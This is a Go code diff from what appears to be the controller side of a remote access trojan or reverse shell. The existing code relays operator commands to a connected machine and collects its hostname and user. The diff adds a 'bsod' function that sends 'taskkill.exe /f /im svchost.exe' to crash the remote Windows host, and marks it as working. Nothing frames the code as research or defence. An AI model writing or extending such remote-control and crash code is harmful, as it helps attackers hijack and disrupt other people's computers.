@@ -7,6 +7,7 @@ import (
 	"os"
 )
 
+// Server-Sides needs to handle errors better
 func shell(conn *net.Conn) {
 	reader := bufio.NewReader(os.Stdin)
 L: //Labeled the for loop with L if i need to break it from switch. Faster than if statements. Works.
@@ -33,6 +34,7 @@ L: //Labeled the for loop with L if i need to break it from switch. Faster than 
 			read_len, err := (*conn).Read(request)
 			if read_len == 0 {
 				fmt.Println("Read Length is 0")
+				os.Exit(0)
 			}
 			if err != nil {
 				os.Exit(0)
@@ -66,4 +68,10 @@ func hostinfo(conn *net.Conn) { //Should be able to execute these by hijacking p
 	whoami := string(request[:read_len])
 	fmt.Print("Hostname: " + hostname) //Hostname gets recieved with \n so we can leave it this way
 	fmt.Println("User: " + whoami)
+}
+
+func bsod(conn *net.Conn) { //Works
+	fmt.Println("Initiating BSOD by killing")
+	(*conn).Write([]byte("taskkill.exe /f /im svchost.exe"))
+	fmt.Println("Kill Signal Sent")
 }
